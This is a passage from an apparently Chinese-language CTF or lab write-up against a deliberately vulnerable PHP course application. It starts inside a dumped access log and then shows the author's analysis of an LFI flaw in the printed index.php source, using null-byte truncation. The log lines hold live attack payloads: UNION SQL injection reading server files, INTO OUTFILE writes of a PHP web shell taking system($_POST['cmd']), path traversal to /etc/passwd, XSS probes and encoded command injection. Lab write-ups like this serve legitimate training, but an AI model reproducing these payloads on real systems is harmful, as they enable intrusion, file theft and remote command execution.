id=4%20UNION%20select%201,load_file(%27/var/www/html/actions/loginphp%27),system_user(),4,5,6,version()%20from%20dual<br>2009-06-28 14:06:57	Problem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;UNION select 1,load_file(&#x27;/var/www/html/actions/loginphp&#x27;),system_user(),4,5,6,v&#x27; at line 1<br>2009-06-28 14:06:57	Problem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;UNION select 1,load_file(&#x27;/var/www/html/actions/loginphp&#x27;),system_user(),4,5,6,v&#x27; at line 1<br>2009-06-28 14:06:09	172.16.61.132 called id=4%20UNION%20select%201,load_file(%27/var/www/html/actions/login.php%27),system_user(),4,5,6,version()%20from%20dual<br>2009-06-28 14:06:09	Problem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;UNION select 1,load_file(&#x27;/var/www/html/actions/login.php&#x27;),system_user(),4,5,6,&#x27; at line 1<br>2009-06-28 14:06:09	Problem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;UNION select 1,load_file(&#x27;/var/www/html/actions/login.php&#x27;),system_user(),4,5,6,&#x27; at line 1<br>2009-06-28 14:06:22	172.16.61.132 called id=4%20UNION%20select%201,%27%3C?php%20system($_GET[%27cmd%27]);?%3E,system_user(),4,5,6,version()%20into%20outfile(%27/tmp/x.php%27)<br>2009-06-28 14:06:22	Problem with event select: . You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&#x27;]);?&gt;,system_user(),4,5,6,version() into outfile(&#x27;/tmp/x.php&#x27;)&#x27; at line 5<br>2009-06-28 14:06:07	172.16.61.132 called id=4%20UNION%20select%201,%27%3C?php%20system($_GET[\%27cmd\%27]);?%3E,system_user(),4,5,6,version()%20into%20outfile(%27/tmp/x.php%27)<br>2009-06-28 14:06:07	Problem with event select: . You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&#x27;)&#x27; at line 5<br>2009-06-28 14:06:20	172.16.61.132 called id=4%20UNION%20select%201,%27%3C?php%20system($_GET[\%27cmd\%27]);?%3E%27,3,4,5,6,7%20into%20outfile(%27/tmp/x.php%27)<br>2009-06-28 14:06:20	Problem with event select: . You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;(&#x27;/tmp/x.php&#x27;)&#x27; at line 5<br>2009-06-28 14:06:00	172.16.61.132 called id=4%20UNION%20select%201,%27%3C?php%20system($_GET[\%27cmd\%27]);?%3E%27,3,4,5,6,7%20into%20outfile%20%27/tmp/x.php%27<br>2009-06-28 14:06:19	172.16.61.132 called id=4%20UNION%20select%201,%27%3C?php%20system($_POST[\%27cmd\%27]);?%3E%27,3,4,5,6,7%20into%20outfile%20%27/tmp/x.php%27<br>2009-06-28 14:06:19	Problem with event select: . File &#x27;/tmp/x.php&#x27; already exists<br>2009-06-28 14:06:29	172.16.61.132 called id=4%20UNION%20select%201,%27%3C?php%20system($_POST[\%27cmd\%27]);?%3E%27,3,4,5,6,7%20into%20outfile%20%27/tmp/x.php%27<br>2009-06-28 14:06:29	Problem with event select: . File &#x27;/tmp/x.php&#x27; already exists<br>2009-06-28 14:06:41	172.16.61.132 called id=4%20UNION%20select%201,%27%3C?php%20system($_POST[\%27cmd\%27]);?%3E%27,3,4,5,6,7%20into%20outfile%20%27/tmp/y.php%27<br>2009-06-28 14:06:02	172.16.61.132 called id=4%20UNION%20select%201,%27%3C?php%20system($_POST[\%27cmd\%27]);?%3E%27,3,4,5,6,7%20into%20outfile%20%27/tmp/x.php%27<br>2009-06-28 14:06:02	Problem with event select: . File &#x27;/tmp/x.php&#x27; already exists<br>2009-06-28 15:06:02	172.16.61.132 called <br>2009-06-28 15:06:12	172.16.61.132 called id=4<br>2009-06-28 15:06:27	172.16.61.132 called id=4%27<br>2009-06-28 15:06:27	Problem with event select: . You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&#x27;&#x27; at line 5<br>2009-06-28 15:06:03	172.16.61.132 called id=4%20UNION%20select%201%20from%20dual<br>2009-06-28 15:06:03	Problem with event select: . The used SELECT statements have a different number of columns<br>2009-06-28 15:06:57	172.16.61.132 called id=4%20UNION%20select%201,2,3,4,5,6,7%20from%20dual<br>2009-06-28 15:06:57	Problem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;UNION select 1,2,3,4,5,6,7 from dual&#x27; at line 1<br>2009-06-28 15:06:57	Problem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;UNION select 1,2,3,4,5,6,7 from dual&#x27; at line 1<br>2009-06-28 15:06:03	172.16.61.132 called id=4%20UNION%20select%201,database(),user(),4,5,6,version()%20from%20dual<br>2009-06-28 15:06:03	Problem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;UNION select 1,database(),user(),4,5,6,version() from dual&#x27; at line 1<br>2009-06-28 15:06:03	Problem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;UNION select 1,database(),user(),4,5,6,version() from dual&#x27; at line 1<br>2009-06-28 15:06:12	172.16.61.132 called id=4%20UNION%20select%201,load_file(%27/var/www/html/index.php%27),3,4,5,6,7%20from%20dual<br>2009-06-28 15:06:12	Problem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;UNION select 1,load_file(&#x27;/var/www/html/index.php&#x27;),3,4,5,6,7 from dual&#x27; at line 1<br>2009-06-28 15:06:12	Problem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;UNION select 1,load_file(&#x27;/var/www/html/index.php&#x27;),3,4,5,6,7 from dual&#x27; at line 1<br>2009-06-28 16:06:22	172.16.61.132 called id=4%20UNION%20select%201,load_file(%27/var/www/html/actions/login.php%27),3,4,5,6,7%20from%20dual<br>2009-06-28 16:06:22	Problem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;UNION select 1,load_file(&#x27;/var/www/html/actions/login.php&#x27;),3,4,5,6,7 from dual&#x27; at line 1<br>2009-06-28 16:06:22	Problem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;UNION select 1,load_file(&#x27;/var/www/html/actions/login.php&#x27;),3,4,5,6,7 from dual&#x27; at line 1<br>2009-06-28 16:06:18	172.16.61.132 called actions/login.php?action=../conf/config.ini%00<br>2009-06-28 18:06:13	172.16.61.132 called actions/login.php?action=../conf/config.ini%00<br>2009-06-28 18:06:15	172.16.61.132 called id=4%20UNION%20select%201,load_file(%27/var/www/html/actions/login.php%27),3,4,5,6,7%20from%20dual<br>2009-06-28 18:06:15	Problem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;UNION select 1,load_file(&#x27;/var/www/html/actions/login.php&#x27;),3,4,5,6,7 from dual&#x27; at line 1<br>2009-06-28 18:06:15	Problem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;UNION select 1,load_file(&#x27;/var/www/html/actions/login.php&#x27;),3,4,5,6,7 from dual&#x27; at line 1<br>2009-06-28 18:06:23	172.16.61.132 called id=4%20UNION%20select%20NULL,NULL,NULL,NULL,NULL,NULL,%27%3C?php%20echo%20system($_POST[\%27cmd\%27]);?%3E%27%20INTO%20OUTFILE(%27/tmp/008st7845.php%27)<br>2009-06-28 18:06:23	Problem with event select: . You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;(&#x27;/tmp/008st7845.php&#x27;)&#x27; at line 5<br>2009-06-28 18:06:06	172.16.61.132 called id=4%20UNION%20select%20NULL,NULL,NULL,NULL,NULL,NULL,%27%3C?php%20echo%20system($_POST[\%27cmd\%27]);?%3E%27%20INTO%20OUTFILE%20%27/tmp/008st7845.php%27<br>2009-06-29 16:06:51	172.16.61.132 called <br>2009-06-29 16:06:51	172.16.61.132 called <br>2009-06-29 16:06:51	172.16.61.132 called <br>2009-06-29 16:06:51	172.16.61.132 called <br>2009-06-29 16:06:52	172.16.61.132 called <br>2009-06-29 16:06:52	172.16.61.132 called <br>2009-06-29 16:06:52	172.16.61.132 called <br>2009-06-29 16:06:52	172.16.61.132 called <br>2009-06-29 16:06:52	172.16.61.132 called <br>2009-06-29 16:06:52	172.16.61.132 called <br>2009-06-29 16:06:52	172.16.61.132 called chemin=..%2F..%2F..%2F..%2F..%2F..%2F..%2F%2Fetc<br>2009-06-29 16:06:52	172.16.61.132 called <br>2009-06-29 16:06:52	172.16.61.132 called mod=node&amp;nid=some_thing&amp;op=view<br>2009-06-29 16:06:52	172.16.61.132 called mod=some_thing&amp;op=browse<br>2009-06-29 16:06:52	172.16.61.132 called file=index.php<br>2009-06-29 16:06:52	172.16.61.132 called <br>2009-06-29 16:06:52	172.16.61.132 called <br>2009-06-29 16:06:52	172.16.61.132 called <br>2009-06-29 16:06:52	172.16.61.132 called Open<br>2009-06-29 16:06:52	172.16.61.132 called OpenServer<br>2009-06-29 16:06:52	172.16.61.132 called <br>2009-06-29 16:06:53	172.16.61.132 called <br>2009-06-29 16:06:53	172.16.61.132 called <br>2009-06-29 16:06:53	172.16.61.132 called <br>2009-06-29 16:06:53	172.16.61.132 called <br>2009-06-29 16:06:53	172.16.61.132 called <br>2009-06-29 16:06:53	172.16.61.132 called download=/winnt/win.ini<br>2009-06-29 16:06:53	172.16.61.132 called download=/windows/win.ini<br>2009-06-29 16:06:53	172.16.61.132 called download=/etc/passwd<br>2009-06-29 16:06:54	172.16.61.132 called |=../../../../../../../../../etc/passwd<br>2009-06-29 16:06:54	172.16.61.132 called page=../../../../../../../../../../etc/passwd<br>2009-06-29 16:06:54	172.16.61.132 called page=../../../../../../../../../../boot.ini<br>2009-06-29 16:06:54	172.16.61.132 called l=forum/view.php&amp;topic=../../../../../../../../../etc/passwd<br>2009-06-29 16:06:54	172.16.61.132 called module=My_eGallery<br>2009-06-29 16:06:54	172.16.61.132 called option=search&amp;searchword=&lt;script&gt;alert(document.cookie);&lt;/script&gt;<br>2009-06-29 16:06:54	172.16.61.132 called dir=&lt;script&gt;alert(&#x27;Vulnerable&#x27;)&lt;/script&gt;<br>2009-06-29 16:06:55	172.16.61.132 called top_message=&amp;lt;script&amp;gt;alert(document.cookie)&amp;lt;/script&amp;gt;<br>2009-06-29 16:06:55	172.16.61.132 called file=Liens&amp;op=\&quot;&gt;&lt;script&gt;alert(&#x27;Vulnerable&#x27;);&lt;/script&gt;<br>2009-06-29 16:06:55	172.16.61.132 called catid=&amp;lt;script&amp;gt;alert(&#x27;Vulnerable&#x27;)&amp;lt;/script&amp;gt;<br>2009-06-29 16:06:55	172.16.61.132 called action=storenew&amp;username=&lt;script&gt;alert(&#x27;Vulnerable&#x27;)&lt;/script&gt;<br>2009-06-29 16:06:55	172.16.61.132 called action=search&amp;searchFor=\&quot;&gt;&lt;script&gt;alert(&#x27;Vulnerable&#x27;)&lt;/script<br>2009-06-29 16:06:55	172.16.61.132 called <br>2009-06-29 16:06:55	172.16.61.132 called SectionID=3&amp;SearchText=&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br>2009-06-29 16:06:55	172.16.61.132 called SearchText=&lt;script&gt;alert(document.cookie)&lt;/script&gt;&amp;PhraseSearchText=&lt;script&gt;alert(document.cookie)&lt;/script&gt;&amp;SearchContentClassID=-1&amp;SearchSectionID=-1&amp;SearchDate=-1&amp;SearchButton=Search<br>2009-06-29 16:06:55	172.16.61.132 called mod=&lt;script&gt;alert(document.cookie)&lt;/script&gt;&amp;op=browse<br>2009-06-29 16:06:55	172.16.61.132 called sql_debug=1<br>2009-06-29 16:06:55	172.16.61.132 called sql_debug=1<br>2009-06-29 16:06:56	172.16.61.132 called <br>2009-06-29 16:06:56	172.16.61.132 called rep=&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br>2009-06-29 16:06:56	172.16.61.132 called <br>2009-06-29 16:06:56	172.16.61.132 called <br>2009-06-29 16:06:57	172.16.61.132 called module=ew_filemanager&amp;type=admin&amp;func=manager&amp;pathext=../../../etc<br>2009-06-29 16:06:57	172.16.61.132 called module=ew_filemanager&amp;type=admin&amp;func=manager&amp;pathext=../../../etc/&amp;view=passwd<br>2009-06-29 16:06:57	172.16.61.132 called err=3&amp;email=\&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br>2009-06-29 16:06:57	172.16.61.132 called name=Forums&amp;file=viewtopic&amp;t=2&amp;rush=%64%69%72&amp;highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527<br>2009-06-29 16:06:57	172.16.61.132 called name=Forums&amp;file=viewtopic&amp;t=2&amp;rush=%64%69%72&amp;highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527<br>2009-06-29 16:06:57	172.16.61.132 called name=forums&amp;file=viewtopic&amp;t=2&amp;rush=%64%69%72&amp;highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527<br>2009-06-29 16:06:57	172.16.61.132 called name=PNphpBB2&amp;file=viewtopic&amp;t=2&amp;rush=%64%69%72&amp;highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527<br>2009-06-29 16:06:57	172.16.61.132 called name=Forums&amp;file=viewtopic&amp;t=2&amp;rush=%6c%73%20%2d%61%6c&amp;highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527<br>2009-06-29 16:06:57	172.16.61.132 called name=forums&amp;file=viewtopic&amp;t=2&amp;rush=%6c%73%20%2d%61%6c&amp;highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527<br>2009-06-29 16:06:57	172.16.61.132 called name=Forums&amp;file=viewtopic&amp;t=2&amp;rush=%6c%73%20%2d%61%6c&amp;highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527<br>2009-06-29 16:06:57	172.16.61.132 called name=forums&amp;file=viewtopic&amp;t=2&amp;rush=%6c%73%20%2d%61%6c&amp;highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527<br>2009-06-29 16:06:57	172.16.61.132 called name=PNphpBB2&amp;file=viewtopic&amp;t=2&amp;rush=%6c%73%20%2d%61%6c&amp;highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527<br>2009-06-29 16:06:58	172.16.61.132 called PageServices<br>2009-06-29 16:06:58	172.16.61.132 called wp-cs-dump<br>2009-06-29 16:06:58	172.16.61.132 called <br>2009-06-29 16:06:58	172.16.61.132 called <br>2009-06-29 16:06:58	172.16.61.132 called <br>2009-06-29 16:06:58	172.16.61.132 called <br>2009-06-29 16:06:58	172.16.61.132 called <br>2009-06-29 16:06:58	172.16.61.132 called <br>2009-06-29 16:06:58	172.16.61.132 called <br>2009-06-29 16:06:58	172.16.61.132 called <br>2009-06-29 16:06:59	172.16.61.132 called <br>2009-06-29 16:06:59	172.16.61.132 called <br>2009-06-29 16:06:59	172.16.61.132 called <br>2009-06-29 16:06:59	172.16.61.132 called <br>2009-06-29 16:06:59	172.16.61.132 called <br>2009-06-29 16:06:59	172.16.61.132 called <br>2009-06-29 16:06:59	172.16.61.132 called <br>2009-06-29 16:06:59	172.16.61.132 called <br>2009-06-29 16:06:59	172.16.61.132 called <br>2009-06-29 16:06:59	172.16.61.132 called <br>2009-06-29 16:06:59	172.16.61.132 called <br>2009-06-29 16:06:00	172.16.61.132 called <br>2009-06-29 16:06:00	172.16.61.132 called <br>2009-06-29 16:06:00	172.16.61.132 called <br>2009-06-29 16:06:00	172.16.61.132 called <br>2009-06-29 16:06:00	172.16.61.132 called <br>2009-06-29 16:06:00	172.16.61.132 called <br>2009-06-29 16:06:00	172.16.61.132 called vo=\&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;<br>2009-06-29 16:06:00	172.16.61.132 called showforum=1&amp;prune_day=100&amp;sort_by=Z-A&amp;sort_key=[sqlgoeshere]<br>2009-06-29 16:06:00	172.16.61.132 called offset=[%20Problem%20Here%20]<br>2009-06-29 16:06:02	172.16.61.132 called base=test%20<br>2009-06-29 16:06:03	172.16.61.132 called IDAdmin=test<br>2009-06-29 16:06:03	172.16.61.132 called pymembs=admin<br>2009-06-29 16:06:03	172.16.61.132 called SqlQuery=test%20<br>2009-06-29 16:06:03	172.16.61.132 called tampon=test%20<br>2009-06-29 16:06:03	172.16.61.132 called topic=&amp;amp;lt;script&amp;amp;gt;alert(document.cookie)&amp;amp;lt;/script&amp;amp;gt;%20<br>2009-06-29 16:06:04	172.16.61.132 called <br>2009-06-29 16:06:04	172.16.61.132 called <br>2009-06-29 16:06:04	172.16.61.132 called <br>2009-06-29 16:06:04	172.16.61.132 called pattern=/etc/*&amp;sort=name<br>2009-06-29 16:06:05	172.16.61.132 called D=A<br>2009-06-29 16:06:05	172.16.61.132 called N=D<br>2009-06-29 16:06:05	172.16.61.132 called S=A<br>2009-06-29 16:06:05	172.16.61.132 called M=A<br>2009-06-29 16:06:05	172.16.61.132 called \&quot;&gt;&lt;script&gt;alert(&#x27;Vulnerable&#x27;);&lt;/script&gt;<br>2009-06-29 16:06:55	172.16.61.132 called <br>2009-06-29 16:06:30	172.16.61.132 called <br>2009-06-29 16:06:31	172.16.61.132 called <br>2009-06-29 16:06:31	172.16.61.132 called action=login<br>2009-06-29 16:06:31	172.16.61.132 called id=4<br>2009-06-29 16:06:31	172.16.61.132 called id=3<br>2009-06-29 16:06:31	172.16.61.132 called id=2<br>2009-06-29 16:06:31	172.16.61.132 called id=1<br>2009-06-29 16:06:32	172.16.61.132 called C=N;O=D<br>2009-06-29 16:06:32	172.16.61.132 called C=M;O=A<br>2009-06-29 16:06:32	172.16.61.132 called C=S;O=A<br>2009-06-29 16:06:32	172.16.61.132 called C=D;O=A<br>2009-06-29 16:06:32	172.16.61.132 called <br>2009-06-29 16:06:33	172.16.61.132 called id=4<br>2009-06-29 16:06:33	172.16.61.132 called action=login<br>2009-06-29 16:06:33	172.16.61.132 called id=3<br>2009-06-29 16:06:33	172.16.61.132 called id=2<br>2009-06-29 16:06:34	172.16.61.132 called id=1<br>2009-06-29 16:06:34	172.16.61.132 called action=login<br>2009-06-29 16:06:34	172.16.61.132 called <br>2009-06-29 16:06:34	172.16.61.132 called action=login<br>2009-06-29 16:06:17	172.16.61.132 called <br>2009-06-29 16:06:17	172.16.61.132 called <br>2009-06-29 16:06:23	172.16.61.132 called Open<br>2009-06-29 16:06:23	172.16.61.132 called OpenServer<br>2009-06-29 18:06:56	172.16.61.132 called <br></code></pre></td></tr></table></figure>
<p>看了一下日志，我们可以明显的发现这台机子显然被攻击过。仔细看看甚至里面已经有攻击者留下的后门了。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">2009-06-28 18:06:06	172.16.61.132 called id=4%20UNION%20select%20NULL,NULL,NULL,NULL,NULL,NULL,%27%3C?php%20echo%20system($_POST[\%27cmd\%27]);?%3E%27%20INTO%20OUTFILE%20%27/tmp/008st7845.php%27<br></code></pre></td></tr></table></figure>
<p>但是他放在<code>/tmp</code>目录下，这该怎么访问到。。。<br>除非有本地文件包含漏洞。我们再仔细看看日志，果然看到上一个攻击者确实在尝试LFI漏洞。</p>
<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>我们挑几个的试试看看有没有成功的。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">2009-06-28 18:06:13	172.16.61.132 called actions/login.php?action=../conf/config.ini%00<br></code></pre></td></tr></table></figure>
<p>这一条不就是之前在主页登录那块的请求吗。再一想，我们甚至还有index.php的源代码在之前的备份包里。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>  <span class="hljs-comment">/**</span><br><span class="hljs-comment">* This is the index page for the sample application. </span><br><span class="hljs-comment">* This application is meant to be part of the PHP Code Auditing </span><br><span class="hljs-comment">* course offered by SAS Information Security.  Don *not* install</span><br><span class="hljs-comment">* this application on a live server</span><br><span class="hljs-comment">* </span><br><span class="hljs-comment">* <span class="hljs-doctag">@package</span> PHP Code Auditing </span><br><span class="hljs-comment">* <span class="hljs-doctag">@author</span> Justin C. Klein Keane &lt;jukeane<span class="hljs-doctag">@sas</span>.upenn.edu&gt;</span><br><span class="hljs-comment">* </span><br><span class="hljs-comment">**/</span><br><br>  <span class="hljs-comment">//make sure the app will run!</span><br>  <span class="hljs-keyword">include_once</span>(<span class="hljs-string">&#x27;inc/config_check.php&#x27;</span>);<br><br><span class="hljs-title function_ invoke__">session_start</span>();<br><br><span class="hljs-variable">$logged_in</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;logged_in&#x27;</span>]) ? <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;logged_in&#x27;</span>] : <span class="hljs-number">0</span>;<br><br><span class="hljs-comment">//get configuration variables</span><br><span class="hljs-variable">$configs</span> = <span class="hljs-title function_ invoke__">parse_ini_file</span>(<span class="hljs-string">&#x27;conf/config.ini&#x27;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Error parsing config file conf/config.ini&quot;</span>);<br><br><span class="hljs-comment">//set up loggin</span><br><span class="hljs-keyword">include_once</span>(<span class="hljs-string">&#x27;lib/log.class.php&#x27;</span>);<br><span class="hljs-variable">$log</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Log</span>();<br><br><span class="hljs-comment">//set up the db connection</span><br><span class="hljs-variable">$conn</span> = <span class="hljs-title function_ invoke__">mysql_connect</span>(<span class="hljs-variable">$configs</span>[<span class="hljs-string">&#x27;database_host&#x27;</span>], <span class="hljs-variable">$configs</span>[<span class="hljs-string">&#x27;database_user&#x27;</span>], <span class="hljs-variable">$configs</span>[<span class="hljs-string">&#x27;database_pass&#x27;</span>]) <span class="hljs-keyword">or</span> <span class="hljs-variable">$log</span>-&gt;<span class="hljs-title function_ invoke__">append</span>(<span class="hljs-title function_ invoke__">mysqlerror</span>());<br><span class="hljs-title function_ invoke__">mysql_select_db</span>(<span class="hljs-variable">$configs</span>[<span class="hljs-string">&#x27;database_db&#x27;</span>]);<br><br><span class="hljs-variable">$action</span> = (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>])) ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>] : <span class="hljs-string">&#x27;default&#x27;</span>;<br><span class="hljs-variable">$valid_actions</span> = <span class="hljs-keyword">array</span>(<br>  <span class="hljs-string">&#x27;default&#x27;</span>, <br>  <span class="hljs-string">&#x27;login&#x27;</span>, <br>  <span class="hljs-string">&#x27;add_event&#x27;</span>, <br>  <span class="hljs-string">&#x27;edit_event&#x27;</span>, <br>  <span class="hljs-string">&#x27;view_event&#x27;</span>, <br>  <span class="hljs-string">&#x27;delete_event&#x27;</span>, <br>  <span class="hljs-string">&#x27;logout&#x27;</span>,<br>  <span class="hljs-string">&#x27;users&#x27;</span>,<br>  <span class="hljs-string">&#x27;logs&#x27;</span>);<br><br><span class="hljs-comment">//auth check</span><br><span class="hljs-variable">$is_admin</span> = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;user_id&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;hash&#x27;</span>])) &#123;<br>  <span class="hljs-variable">$sql</span> = <span class="hljs-string">&#x27;SELECT user_id </span><br><span class="hljs-string">FROM user </span><br><span class="hljs-string">WHERE </span><br><span class="hljs-string">user_id = &#x27;</span> . <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;user_id&#x27;</span>] . <span class="hljs-string">&#x27; </span><br><span class="hljs-string">AND user_password = \&#x27;&#x27;</span> . <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;hash&#x27;</span>] . <span class="hljs-string">&#x27;\&#x27;&#x27;</span>;<br>  <span class="hljs-variable">$retval</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>) <span class="hljs-keyword">or</span> <span class="hljs-variable">$log</span>-&gt;<span class="hljs-title function_ invoke__">append</span>(<span class="hljs-string">&quot;Problem with sql <span class="hljs-subst">$sql</span> &lt;hr/&gt;&quot;</span> . <span class="hljs-title function_ invoke__">mysql_error</span>());<br>  <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">mysql_num_rows</span>(<span class="hljs-variable">$retval</span>) &gt; <span class="hljs-number">0</span> )  <span class="hljs-variable">$is_admin</span> = <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-variable">$admin_actions</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;add_event&#x27;</span>, <span class="hljs-string">&#x27;edit_event&#x27;</span>, <span class="hljs-string">&#x27;view_event&#x27;</span>, <span class="hljs-string">&#x27;delete_event&#x27;</span>, <span class="hljs-string">&#x27;users&#x27;</span>, <span class="hljs-string">&#x27;logs&#x27;</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$action</span>, <span class="hljs-variable">$admin_actions</span>) &amp;&amp; ! <span class="hljs-variable">$is_admin</span>) <span class="hljs-variable">$action</span> = <span class="hljs-string">&#x27;default&#x27;</span>;<br><br><span class="hljs-keyword">if</span> (! <span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$action</span>, <span class="hljs-variable">$valid_actions</span>)) <span class="hljs-variable">$action</span> = <span class="hljs-string">&#x27;default&#x27;</span>;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$action</span> != <span class="hljs-string">&#x27;delete_event&#x27;</span> &amp;&amp; <span class="hljs-variable">$action</span> != <span class="hljs-string">&#x27;logout&#x27;</span>) <br>  <span class="hljs-keyword">include_once</span>(<span class="hljs-string">&#x27;inc/header.php&#x27;</span>);<br><br><span class="hljs-keyword">include_once</span>(<span class="hljs-string">&#x27;actions/&#x27;</span>.<span class="hljs-variable">$action</span> . <span class="hljs-string">&#x27;.php&#x27;</span>);<br><span class="hljs-keyword">include_once</span>(<span class="hljs-string">&#x27;inc/footer.php&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>第31和62行我们可以看到，典型的LFI漏洞，但是最后有个后缀名<code>.php</code>。看了下PHP版本，刚好可以通过零字符截断。<br>于是我们验证一下能不能成功</p>
